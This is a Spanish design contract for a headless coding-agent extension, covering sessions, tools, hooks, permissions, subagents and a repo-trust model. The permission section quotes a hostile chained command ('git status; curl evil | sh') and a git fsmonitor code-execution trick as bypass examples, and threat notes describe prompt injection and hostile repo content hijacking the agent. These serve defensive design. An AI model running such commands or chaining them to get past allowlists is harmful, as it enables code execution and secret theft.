# La extensión oficial del agente: contrato

Estado: **borrador para discusión**. Como providers y sesiones, esto NO es
API sagrada del core: es el contrato público de la extensión oficial
`agent`, versionado aparte. Construida íntegramente sobre [api.md](api.md),
[providers.md](providers.md) y [sesiones.md](sesiones.md) — si algo de aquí
no se puede implementar con esas tres superficies, son ellas las que están
incompletas (ADR-003).

## 1. Decisión estructural: motor sin UI

La extensión `agent` es un **motor headless**. No pinta nada: ejecuta el
loop, ejecuta tools, emite eventos. La interfaz de chat es **otra** extensión
oficial (`chat`) que consume este contrato igual que podría hacerlo cualquier
tercero. Consecuencias buscadas:

- Modo scripting/CI gratis: `enu -e "script.lua"` puede usar el agente sin
  terminal interactivo.
- Los subagentes pueden correr en workers (sin `ui`) sin caso especial.
- La UI oficial no tiene acceso privilegiado: la API pública es suficiente o
  está incompleta.

## 2. Sesiones y turno

```
agent.session(opts) ⏸ -> Session   -- IO suspendiente: lock de escritor y, con resume, replay (A-28)
  opts: { model: "proveedor/modelo", system?, cwd?, tools?: string[],
          skills?: string[], permissions?: Permissions, parent?,
          thinking?: { mode?: "off"|"adaptive"|"budget", budget?: integer },
          resume?: string }                          -- id: reabre en vez de crear

Session:send(content: string|Block[]) ⏸ -> Message  -- ejecuta el turno completo
Session:cancel()                                     -- cancela el turno en curso
Session:fork(at?: integer, opts?: tabla) ⏸ -> Session -- bifurca y re-aloja; copia el prefijo (G39; sesiones.md §5)
Session:compact() ⏸                                  -- compactación manual
Session:set_model(model: string)                     -- cambio en caliente (G19)
Session:set_thinking(thinking)                        -- razonamiento en caliente (ADR-016)
Session:close()                                      -- suelta el lock de escritor (G39); síncrona a propósito: llamable desde enu.task.cleanup
Session.id / Session.usage -> { context_tokens, cost_usd, turns }
```

> **Estado de implementación.** ✅ Implementado `send/spawn/set_model/close` y
> también `cancel`, `fork`, `compact` y `clear_queue` ([pospuesto.md](pospuesto.md)
> **P22**, resuelto). El turno corre en una task **propia de la sesión** (la que
> `cancel` cancela); `send` espera el resultado por un future, no por la task, así
> que cancelar el turno no cancela a quien llamó (su `send` devuelve nil).
> ⏳ Pendiente de construcción (G39): el `opts?` de `fork` y su regla de herencia
> completa — la v1 hereda una lista parcial que pierde `skills` y `thinking`.

**El turno** (`send`) es el corazón del contrato:

1. Anexa el mensaje del usuario (entrada `message` en el transcript).
2. Ensambla el request canónico (§7) y pasa por hooks `request.pre`.
3. Llama al adaptador (`stream`); re-emite los deltas en el bus
   (`agent:delta`) para quien pinte.
4. Al `done`: persiste el mensaje (con `usage` y modelo), emite
   `agent:message`.
5. Si `stop_reason == "tool_calls"`: por cada tool call, **en orden** (la
   ejecución paralela está pospuesta, [P12](pospuesto.md)): pipeline de
   permisos (§5) → hooks `tool.pre` → handler → hooks `tool.post` →
   `tool_result`. Después, vuelve al paso 2.
6. Termina cuando el modelo para sin pedir tools, o al agotar
   `max_turns` (configurable; protección contra loops).

**Reentrada (G4)**: `send` con un turno en vuelo **encola** el mensaje; el
loop lo inyecta al ensamblar el siguiente request (entre iteraciones,
nunca a mitad de un stream). El usuario puede así corregir al agente
mientras trabaja ("usa pnpm, no npm"). Todos los `send` consumidos por un
mismo turno resuelven con el mensaje final de ese turno. `Session:cancel()`
cancela el turno, **no** vacía la cola (vaciarla es acción aparte:
`Session:clear_queue()`). *(✅ Implementado: [pospuesto.md](pospuesto.md) **P23**.
El loop drena la cola al inicio de cada iteración; todos los `send` consumidos por
un turno resuelven con su mensaje final.)*

**Reanudación (G18, G46)**: `opts.resume = <id>` reabre una sesión existente
en vez de crearla: replay del transcript ([sesiones.md](sesiones.md) §3) y
adquisición del lock de escritor (§6, con su flujo de conflicto — fork,
solo lectura o forzar). El replay reconstruye el historial **y reaplica las
entradas `event` del agente** — la sesión continúa *donde estaba*, no donde
arrancó — con precedencia explícita (G46): **opts del resume > `event` del
transcript > `agent.toml`**. Los `opts` siguen siendo estado efímero del
proceso — no se persisten ni reescriben historia (G18) —, pero solo pisan
al transcript *cuando se dan*: un `resume` sin `model` rige por el último
`set_model` grabado (last-wins, sesiones.md §3), no por el default. Para
los repetibles (`set_model`, `set_thinking`) la última entrada gana; los
acumulativos (`allow`/`deny`, §5) se **reaplican en orden** sobre la
política base y ningún opts los pisa — los permisos en caliente son una
palanca de seguridad: perderlos al reanudar sorprende. Si el modelo grabado
ya no resuelve (el provider desapareció), reanudar falla con `EPROVIDER` al
abrir — mejor que en el primer turno —; el escape es un `opts.model`
explícito, que tiene precedencia. El id sale del listado de sesiones
(sesiones.md §7).

**Cambio de modelo (G19)**: `Session:set_model("proveedor/modelo")` valida
contra el registro de providers, escribe una entrada `event` en el
transcript ([sesiones.md](sesiones.md) §3) y aplica desde el siguiente
request; con un turno en vuelo, al ensamblar la siguiente iteración (como
con la reentrada), nunca a mitad de un stream.

**Fork y cierre (G39)**: `Session:fork(at?, opts?)` bifurca la historia en
una sesión nueva **autocontenida** — el prefijo se **copia** al transcript
de la hija y `meta.parent = { id, entry = at }` queda como enlace
navegacional ([sesiones.md](sesiones.md) §5). `at` indexa el **historial de
mensajes vigente** (por defecto, el final; tras una compactación, el
historial vigente arranca en el resumen). La hija **hereda todos los opts
efímeros del padre** (model, cwd, system, permissions, skills, thinking,
max_turns, tools...) salvo los que `opts` sobreescriba, con la regla de
`spawn` (§9, §11): los permisos **solo recortan**, nunca amplían. Los
`opts` son efímeros como en `resume` (G18): no se persisten ni reescriben
historia. Es la pieza del *fork-como-replicación* (pseudocódigo, ronda 8):
K variantes que comparten el prefijo exacto, cada una re-alojada en su
worktree vía `opts.cwd`. `Session:close()` suelta el lock de escritor
([sesiones.md](sesiones.md) §6) y marca la sesión cerrada (idempotente;
los métodos posteriores fallan con error accionable). La regla de la casa:
quien abre sesiones las cierra (`enu.task.cleanup`); el GC como red de
seguridad no determinista, igual que los `Proc` de [api.md](api.md) §6.

**Control de razonamiento ([ADR-016](adr.md#adr-016--modelo-canónico-de-thinking-con-mode-y-traducción-por-modelo-en-el-adaptador))**:
`opts.thinking` (o el default de `agent.toml [thinking]`, §10) fija el modo de
razonamiento que llevará cada request canónico (`thinking`, providers.md §2.1);
`Session:set_thinking(mode|tabla)` lo cambia en caliente (mismo flujo que
`set_model`: desde el siguiente request). La sesión solo elige el **modo**
(`"off"`/`"adaptive"`/`"budget"`); el **dialecto** que cada modelo entiende lo
resuelve el adaptador con el dato `thinking` del `providers.toml` (un modelo de
dialecto `"none"` ignora la petición). Un hook `request.pre` puede afinar el
`thinking` por turno.

Errores del adaptador con `retryable = true`: reintento con backoff
exponencial y límite configurable — la política vive aquí, nunca en el
adaptador (providers.md §3.3).

## 3. Tools

```
agent.tool{
  name, description,
  schema: tabla,                  -- JSON Schema de los args
  handler: function(args, ctx) ⏸ -> string|Block[]|tabla,
  permissions?: { default = "ask"|"allow"|"deny" },
}
```

- El handler corre como task: puede suspender (fs, proc, http...) sin
  bloquear nada. Errores lanzados → `tool_result` con `is_error = true`
  (el modelo ve el error; el loop no se rompe).
- `ctx = { session, cwd, progress(text), ask(question) ⏸ }`. `progress`
  emite `agent:tool.progress` (la UI lo pinta en vivo); `ask` dispara el
  flujo de §5.
- Las tools básicas (read/write/edit de ficheros, bash, grep, glob...) las
  trae la propia extensión, registradas con esta misma función — dogfooding.
- MCP encaja aquí sin caso especial: la extensión `mcp` registra cada tool
  remota con `agent.tool{...}` y su handler habla JSON-RPC por `enu.proc`.

**Higiene del entorno de los subprocesos (G55, SEC-04).** Los comandos que la
tool `bash` ejecuta los propone el modelo: heredarles el entorno completo del
proceso regalaría la API key del provider a cualquier `env`, `curl` o
`postinstall` hostil — el mismo secreto que paga las llamadas del agente, al
alcance de todo el código no confiable que el agente corre. Por eso la tool
`bash` monta por defecto el entorno del hijo **sin** las variables de
`providers.secret_env_vars()` ([providers.md](providers.md) §4); el mismo
recorte aplica a los servidores MCP que se lanzan por `enu.proc`. El core
queda intacto: `enu.proc` ya da control total del entorno por llamada —
`opts.env` presente **reemplaza** el entorno heredado ([api.md](api.md) §6;
semántica de reemplazo fijada en S16 de
[decisiones-implementacion.md](decisiones-implementacion.md)), y para
"heredado menos estas" existe el idioma `env -u` del SO — lo que este contrato fija es
el **default** con el que la extensión ejerce ese control, porque "provider"
es vocabulario de producto y el recorte vive donde ese vocabulario existe
(ADR-003). El opt-in para el caso legítimo (un script del repo que llama a la
API con la misma clave) es explícito y nominal: `inherit_secrets = ["VAR",
...]` bajo `[tools.bash]` en el `agent.toml` **del usuario** — lista de
nombres exactos, sin comodín "todos": el opt-in nombra lo que regala,
auditable de un vistazo (el espíritu del amortiguador 3 de §5: el riesgo se
elige, no se hereda). No puede concederlo el `agent.toml` del proyecto (amplía
permisos: se ignora, regla 1 de §11), ni los args de la tool (el modelo se
autoconcedería el secreto por inyección de prompt), ni los `opts` de sesión —
las sesiones las abre código orquestador arbitrario (drivers, subagentes) y
un secreto se concede en un único sitio: la config del usuario.
Para un servidor MCP, el
opt-in es su propia entrada de configuración —escrita por el usuario, acto
consciente como instalar un plugin (§11)—: un `env` explícito para ese
servidor.

> ⏳ **Pendiente de construcción** (G55): la extensión `0.1.0`, construida
> antes de esta resolución, todavía hereda el entorno completo en sus
> subprocesos. El recorte por defecto e `inherit_secrets` se implementarán
> citando este contrato y `providers.secret_env_vars()`
> ([providers.md](providers.md) §4).

## 4. Hooks

Dos mecanismos, deliberadamente separados:

**Notificaciones** (fire-and-forget, bus del core `enu.events`, namespace
`agent:`): `session.start`, `session.end`, `turn.start`, `turn.end`,
`delta`, `message`, `tool.start`, `tool.progress`, `tool.end`, `compact`,
`error`, `permission.asked`, `permission.denied` (G40, §5). Para pintar, loggear, observar. *(El evento
`compact` solo se emitirá cuando exista la compactación automática:
[pospuesto.md](pospuesto.md) (P25).)* El namespace
`agent:` no es una reserva del core (el core no sabe de agentes, ADR-003):
es el namespace del plugin `agent`, protegido por la unicidad del nombre de
plugin como cualquier otro (G26, [api.md](api.md) §4).

**Garantía de error visible.** Cualquier fallo del turno —el adaptador/provider
lanza (p. ej. HTTP 401 por API key ausente o inválida, red caída), un hook
`request.pre` veta, o se agota `max_turns`— se emite SIEMPRE como `agent:error`
(con `message` y, si lo trae, `code`) antes de cerrar el turno. El cuerpo del turno
corre bajo `pcall`, así que un error nunca mata la task en silencio: la UI lo pinta
y `Session:send` retorna (no se cuelga). La única excepción es un `Session:cancel`
(aborto S08, no capturable por `pcall`): no es un error, así que cierra el turno
como **cancelado** (`turn.end { canceled = true }`) sin emitir `agent:error`.

**Atribución obligatoria (G3)**: todo payload `agent:*` lleva `session`
(id de la sesión emisora; los subagentes emiten con el suyo — su
`meta.parent` enlaza al padre). La extensión emite a través de un helper
único, así el campo se pone en un solo sitio. Filtrar y presentar es
decisión de cada UI.

**Middleware** (pueden modificar o vetar; registro propio de la extensión,
no el bus):

```
agent.hook(point, fn, opts?: {priority}) -> Hook ; Hook:remove()

fn(payload, ctx) ->
    nil                  -- no opina; sigue la cadena
  | payload_modificado   -- sustituye y sigue
  | { deny = "razón" }   -- corta la cadena; la operación se rechaza
```

Puntos v1: `request.pre` (mutar el request canónico: inyectar contexto,
recortar), `tool.pre` (vetar/reescribir args), `tool.post` (reescribir
resultado), `permission` (§5), `compact` (§8). Orden: `priority`
ascendente, luego orden de registro. **El primer deny gana** y se reporta
al modelo como rechazo (en `tool.pre`) o al llamante como error.

## 5. Permisos

```
Permissions = {
  mode  = "ask" | "auto",        -- por defecto "ask"
  allow = { "edit", "bash:git *", ... },   -- patrones tool[:argumento]
  deny  = { "bash:rm *", ... },
}
```

Pipeline para cada tool call: `deny` (corta) → `allow` (concede) → hooks
`permission` (pueden conceder/denegar programáticamente) → si nadie decide
y `mode = "ask"`: se emite `agent:permission.asked` y el turno espera la
respuesta (`agent.permission.respond(id, ...)` — la extensión `chat` pinta
el diálogo). **En headless — no existe `enu.ui`; el test es `enu.has("ui")`
([api.md](api.md) §9, G20) — sin respuesta no hay concesión: default
deny**, con tres amortiguadores que eliminan casi toda la fricción:

1. **Las tools de solo lectura se registran con `default = "allow"`**
   (read, grep, glob...): nunca piden permiso, ni en headless. El deny
   solo muerde a las que mutan (write, bash, red).
2. **El error de denegación es accionable**: nombra el patrón exacto a
   añadir ("denegado `bash:npm install`; añade `allow = [\"bash:npm *\"]`").
   La fricción se paga una vez y con la solución en la mano.
3. **El modo auto existe pero es explícito y ruidoso** (flag tipo
   `--auto-permissions`, para sandboxes y contenedores desechables): el
   riesgo se elige, no se hereda.

Razón del default: headless (CI, scripts) es exactamente el contexto sin
supervisión y el más expuesto a prompt injection; un allowlist declarado
además documenta qué puede hacer el script, auditable de un vistazo.

**Semántica de emparejamiento (G53, [ADR-023](adr.md)).** Un patrón sin `:`
casa por **nombre exacto** de la tool (`"edit"` casa la tool `edit` y ninguna
otra; no hay glob sobre nombres — autorizar una familia, p. ej. todas las
tools de un servidor MCP, es enumerarlas o conceder por hook `permission`,
cf. [arquitectura.md](arquitectura.md)). Un patrón `tool:argumento` casa por **glob
anclado sobre la representación textual del argumento principal** de la tool
(el comando en `bash`, la ruta en `write`…): `*` equivale a `.*`, el resto de
caracteres son literales, y el patrón debe casar el argumento **completo**
(`^…$`) — `bash:git *` no casa `git` a secas ni `mygit status`.

Para `bash`, el glob crudo sobre el string del comando sería una **frontera
falsa** (SEC-02 de la [auditoría de seguridad](audits/auditoria-seguridad-2026-07-16.md)):
`allow = { "bash:git *" }` autorizaría de facto `bash:*`, porque basta
encadenar (`git status; curl evil | sh`) para que el prefijo casado arrastre
un comando arbitrario. Por eso `bash` empareja **por subcomando** (el modelo
del matcher de Claude Code, adaptado):

1. **Descomposición por operadores.** El comando se tokeniza y se parte por
   los separadores reconocidos — `&&`, `||`, `;`, `|`, `|&`, `&` y saltos de
   línea — en una lista de subcomandos. El tokenizador modela **solo** lo que
   entiende: palabras planas y strings entre comillas simples o dobles.
2. **`allow` concede solo si *cada* subcomando casa algún patrón `allow`.**
   `git add -A && git commit -m "wip"` casa `bash:git *`;
   `git status; curl evil | sh` no — `curl evil` no casa ningún patrón y el
   comando entero cae.
3. **Fail-closed.** Cualquier constructo **no modelable** dentro de un
   subcomando hace que ningún `allow` case y la petición siga el pipeline
   (`ask`; en headless, deny): sustitución de comandos (`$( )`, backticks),
   expansión `$VAR` en **posición de comando**, redirecciones (`>`, `<`),
   heredocs, subshells y agrupaciones (`( )`, `{ }`), comillas
   desbalanceadas. La lista de constructos modelables es **cerrada por
   contrato** — es un allowlist: lo que el tokenizador no entiende falla
   hacia `ask`, nunca hacia conceder. Doctrina de [P17](pospuesto.md):
   hacer esto *casi* bien es peor que no tenerlo; el salto a un parser de
   shell completo queda pospuesto con disparador ([P39](pospuesto.md)).
4. **`deny` casa si *algún* subcomando casa el patrón**, con la precedencia
   absoluta que ya tiene en el pipeline. Y es **best-effort declarado**
   (doctrina G16): `deny = { "bash:rm *" }` no muerde `/bin/rm`, un alias ni
   `find . -delete` — un deny recorta descuidos, no detiene adversarios.

**Advertencia honesta.** Ni `allow` ni `deny` acotan lo que un binario
permitido ejecuta *por dentro*: `git -c core.fsmonitor='…' status` ejecuta
código arbitrario a través de un `git` permitido, los hooks de git corren
solos, y un `npm install` concedido ejecuta cualquier `postinstall`. El
emparejamiento decide **qué comandos arrancan**, no qué hacen después; la
valla para eso es la capa *dura* del final de esta sección.

**Aprobación de compuestos.** Al aprobar con "permitir siempre"
([chat.md](chat.md) §5, P29) un comando compuesto, la regla persistida es
**por subcomando** — una entrada `allow` por cada subcomando, no el string
completo: el string encadenado solo volvería a casar exactamente esa
combinación (inútil como regla), mientras que las reglas por subcomando son
reutilizables y auditables una a una. La descomposición la calcula la
extensión `agent` — la dueña del tokenizador — y viaja en el campo
`suggested` (presente tanto en `agent:permission.asked` como en el objeto de
denegación de G40, abajo), como **lista** con un patrón por subcomando: la
UI la muestra y la edita, nunca re-tokeniza por su cuenta.

> ⏳ **Pendiente de construcción.** El matcher de la extensión `agent` `0.1.0`
> es anterior a G53 y aún empareja por glob crudo sobre el string completo.
> Esta semántica es el contrato que la sesión de construcción correspondiente
> debe seguir — «el contrato lidera, el código sigue».

**La denegación viaja como dato (G40).** La prosa accionable es
*presentación*, no el portador (coherente con los errores estructurados de
[api.md](api.md) §1.4): toda denegación produce, una sola vez, un objeto
estructurado

```
{ id, tool, args?,
  source = "deny" | "hook" | "default" | "headless" | "user",
  pattern?,      -- el patrón de la lista deny que mordió (source = "deny")
  suggested? }   -- el/los allow que arreglarían la denegación: string, o
                 -- lista con un patrón por subcomando cuando la petición
                 -- era un bash compuesto (G53)
```

(`source = "user"` es el rechazo en el diálogo interactivo: "toda
denegación" incluye la humana) con dos destinos para dos consumidores
distintos: se emite como
`agent:permission.denied` (observadores **vivos** — drivers, telemetría,
UIs — con la atribución de G3), y va además en el `meta` del `tool_result`
denegado, bajo la clave `denied` ([providers.md](providers.md) §2.2), que
[sesiones.md](sesiones.md) §3 persiste intacto — la denegación **viaja con
el transcript**, y un controlador que lea la sesión a posteriori (incluso
en otra máquina) la extrae sin parsear prosa. Es la pieza del bucle de
escalado asíncrono validado en la ronda 8 de pseudocódigo (escenario 36):
denegación → enmienda de la política por un humano → re-run. El texto
accionable del amortiguador 2 no cambia: sigue siendo lo que el modelo ve
y el humano lee. Y queda especificado lo que el escenario 36 encontró
ambiguo: **`tool.end` se emite también para calls denegadas** (todo
`tool.start` tiene su `tool.end`), con `is_error = true` — es el canal
*genérico* de fallo; `permission.denied` es el *específico* de permisos.

Concurrencia de asks (G3): varias sesiones pueden tener asks pendientes a
la vez; cada una espera su `future` **sin timeout** (un timeout→deny
metería denegaciones sorpresa no deterministas). La UI es responsable de
hacer visibles los pendientes.

Esto es la capa *blanda* (frente al modelo). La capa *dura* para código no
confiable son los workers con `caps` ([api.md](api.md) §13): un subagente en
worker sin `proc` no ejecuta procesos, opine quien opine.

## 6. Skills

> ✅ **Implementado** ([pospuesto.md](pospuesto.md) **P24**). El ensamblado
> descubre skills, inyecta su índice y expone `agent.skills.list(cwd)`; el
> contenido completo lo carga la tool interna `skill` bajo demanda. El contenido
> del repo va tras la puerta TOFU (§11.2, `agent.trust`).

Compatibles con el formato del ecosistema existente: directorio con
`SKILL.md` (frontmatter YAML: `name`, `description` — vía `enu.yaml`).

- Descubrimiento: `config.dir()/skills/` (usuario) + `<repo>/.enu/skills/`
  (proyecto). `agent.skills.list() -> SkillInfo[]`. El contenido del repo
  está sujeto al modelo de confianza de §11.
- Inyección en dos fases (economía de contexto): el system prompt lleva solo
  el **índice** (nombre + descripción); el contenido completo se carga bajo
  demanda mediante la tool interna `skill` que el modelo invoca. 
- Por sesión/subagente: `opts.skills = { "review", "deploy" }` limita el
  índice visible.

## 7. System prompt

Ensamblado por piezas ordenadas: base de la extensión → índice de skills →
fichero de contexto del proyecto (`enu.md` en la raíz del repo, si existe) →
`opts.system`. Los hooks `request.pre` pueden retocar el resultado. Cada
pieza es sustituible por configuración — no hay prompt mágico inaccesible.

> ✅ **Implementado** ([pospuesto.md](pospuesto.md) **P24**). El ensamblado es
> `base → índice de skills → enu.md (tras TOFU) → opts.system`. El descubrimiento
> se captura al abrir la sesión; la inclusión del contenido del repo se decide por
> confianza en cada ensamblado.

## 8. Compactación

> ✅ **Implementado** ([pospuesto.md](pospuesto.md) **P25**). La compactación se
> dispara al rebasar el umbral (defecto 80% del `context`) en el **límite del
> turno** (no entre iteraciones, para no romper el emparejamiento
> tool_call↔tool_result), y emite `agent:compact`. `Session:compact()` es la vía
> manual; el hook `compact` personaliza o impide el resumen.

- Disparo automático: cuando `usage.input_tokens` supera el umbral
  configurable (defecto: 80% del `context` del modelo, dato del
  providers.toml). Fuente de verdad: el `usage` del proveedor, nunca conteo
  local (decisión cerrada en providers.md §5).
- Estrategia por defecto: resumen del prefijo antiguo vía LLM (modelo
  configurable, por defecto el de la sesión) → entrada `compact` en el
  transcript (sesiones.md §3) → el replay para el modelo arranca del
  resumen.
- Personalizable por completo con el hook `compact`: recibe la conversación
  y devuelve el mensaje-resumen (o deny para impedir la compactación).
- `providers.approx_tokens()` disponible para estimaciones previas ("¿me
  cabe este fichero?") antes de tener `usage` ([providers.md](providers.md)
  §4, G23).

## 9. Subagentes

```
Session:spawn(opts) -> Sub
  opts: los de agent.session + { worker? = false, caps?: string[] }

Sub:run(prompt) ⏸ -> Digest    -- turno(s) completos del subagente
  Digest = { text, message, stop_reason, usage, turns }   -- resumen digerido, no el stream
Sub:cancel()
```

- Transcript propio como sesión hija (`meta.parent`, sesiones.md §7).
- Por defecto corre como task en el estado principal (comparte las tools
  registradas; barato).
- `worker = true`: el **loop** corre en un worker (paralelismo real, `caps`
  recortables), pero los **handlers de tools se ejecutan en el estado
  principal vía proxy de mensajes** — los args y resultados son JSON-ables
  por contrato, así que cruzan la frontera sin fricción. Implicaciones:
  - Un solo registro de tools: ninguna se duplica "en versión worker".
  - La seguridad queda centralizada: permisos, hooks `tool.pre/post` y
    diálogos corren en el principal; el worker no puede saltarse el
    pipeline porque la ejecución nunca ocurre en su lado. Dos vallas para
    dos riesgos: los *permisos* heredados limitan qué tools usa el
    subagente; las *caps* limitan qué hace su código Lua directamente.
  - Atribución y supervisión: el worker porta la identidad del plugin
    `agent` capturada en el spawn ([api.md](api.md) §13, G56) — los logs y
    los procesos que su lado Lua lance directamente (si sus `caps` lo
    permiten) se anotan como `agent (worker)` y quedan registrados bajo
    `agent`, así que un `plugin.reload` del agente también los recoge.
  - Latencia del proxy irrelevante (microsegundos vs segundos del LLM).
  - Límite honesto: los streams de los subagentes van en paralelo de
    verdad (ahí está la ganancia), pero sus tool calls se intercalan como
    tasks en el principal. Para tools de IO da igual (suspenden y se
    solapan); una tool con CPU pesada en Lua estorbaría al principal — el
    watchdog la señalará, y su sitio son las primitivas Go o un worker.
- **Limitación conocida (G16)**: nada coordina a dos subagentes paralelos
  escribiendo el mismo fichero — last-write-wins. Deliberado: un lock en
  las tools oficiales sería seguridad falsa (bash y las tools de terceros
  escriben sin pasar por él). El remedio que funciona es **repartir
  territorio** entre subagentes vía prompt, como hacen los harnesses de
  referencia.
- Permisos: el subagente hereda los del padre **recortados** por sus
  `opts.permissions` (nunca ampliados); `caps` aplica la versión dura.
  Para no escribir listas de funciones a mano, la extensión ofrece
  paquetes con nombre como **tablas Lua normales e inspeccionables**
  (`agent.caps.FS_RO = { "fs.read", "fs.stat", ... }`): el vocabulario
  vive aquí (iterable, sustituible), el mecanismo en el core (G6).

## 10. Configuración

`config.dir()/agent.toml`: modelo por defecto, `max_turns`, umbral y modelo
de compactación, **razonamiento por defecto** (`[thinking]` con `mode` y
`budget`, ADR-016), política de retención de sesiones ([P10](pospuesto.md)),
permisos globales, herencia de secretos de la tool `bash` (`[tools.bash]
inherit_secrets`, §3 — G55). La precedencia es la estándar: defaults < global <
proyecto (`<repo>/.enu/agent.toml`) < sesión (`opts`) — con dos excepciones
de seguridad: los permisos del proyecto solo recortan (§11), e
`inherit_secrets` solo se honra del `agent.toml` **del usuario** — ni el del
proyecto ni los `opts` de sesión pueden concederlo (§3).

La extensión acuña su código de error estructurado, **`EAGENT`** (forma de
api.md §1.4, como providers.md §3 acuña `EPROVIDER`): los errores propios del
motor —un `agent.toml` mal formado, `max_turns` agotado sin que el modelo
termine, un subagente cuyo canal muere— se lanzan como `{ code = "EAGENT",
message, detail? }`, capturables con `pcall` (G48). Los errores de *uso* de la
API siguen siendo `EINVAL`, y los del proveedor, `EPROVIDER`.

El campo `model` (`"proveedor/modelo"`) es **obligatorio** para abrir una sesión:
`agent.session` falla con `EINVAL` accionable si no está en `opts` ni en
`agent.toml`. Por eso el onramp `enu --default-config` deja una plantilla **activa**
de `agent.toml` con un `model` por defecto (`anthropic/opus`) y su `providers.toml`
emparejado ([ADR-017](adr.md), [G35](problemas.md)): el primer arranque ya trae un
modelo configurado (solo falta exportar la API key del entorno). Las plantillas se
escriben únicamente si los ficheros no existen; nunca pisan config del usuario.

## 11. Modelo de confianza del contenido del repo (G14)

El repo no es el usuario: su config la escribió un tercero. Dos reglas, sin
sandbox ni diálogos constantes:

1. **El repo solo recorta permisos, jamás amplía.** Los `deny` de
   `<repo>/.enu/agent.toml` se honran siempre; sus `allow`, su `mode` y su
   `inherit_secrets` (§3, G55) se **ignoran** — si el usuario los quiere,
   los copia a su config global (o, para `allow`/`mode`, los concede en
   sesión). Cero fricción, cierra el vector "clonar y abrir
   ejecuta la voluntad del repo".
2. **TOFU de una tecla para el contenido que llega al modelo.** La primera
   vez que enu se abre en un repo con `.enu/skills/` o `enu.md`, una sola
   pregunta ("este repo trae skills/contexto, ¿usarlas? — se recuerda por
   repo", persistido en `data_dir`). Sin respuesta afirmativa (incluido
   headless), ese contenido no se inyecta. Es el mismo patrón `:trust` /
   `vim.secure.read()` de Neovim ante el clásico ataque del `exrc`.

Las descripciones de tools de servidores MCP no entran aquí: instalar un
servidor MCP es un acto consciente del usuario — su responsabilidad, como
instalar un plugin.

<!-- enu:interno -->

## 12. Relación con lo pospuesto

Tool calls paralelas ([P12](pospuesto.md)), workers anidados para subagentes
([P11](pospuesto.md)) y retención de sesiones ([P10](pospuesto.md)) tienen
entrada en el registro de pospuestos con su disparador.

<!-- /enu:interno -->
